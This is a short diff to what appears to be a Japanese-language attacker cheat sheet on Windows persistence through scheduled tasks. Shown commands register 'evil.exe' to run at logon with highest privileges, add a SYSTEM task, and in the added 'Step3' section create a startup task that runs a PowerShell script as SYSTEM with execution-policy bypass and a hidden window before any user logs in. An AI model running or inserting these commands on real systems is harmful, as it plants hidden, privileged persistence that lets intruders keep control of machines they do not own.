@@ -23,3 +23,9 @@ schtasks /create /tn "LogonRun" /tr "C:\Temp\evil.exe" /sc onlogon /rl highest
 # SYSTEM権限で、かつバックグラウンド設定(/itなし)で登録
 schtasks /create /tn "HiddenTask" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru "SYSTEM" /rl highest
 ```
+
+## Step3 システム起動時の実行
+ユーザーがログインする前(Session 0)に、SYSTEM権限で実行する。
+```powershell
+schtasks /create /tn "Step3" /tr "powershell.exe -c -ep bypass -nop -W hidden C:\Users\Public\step3.ps1" /sc onstart /ru "SYSTEM" /rl highest
+```
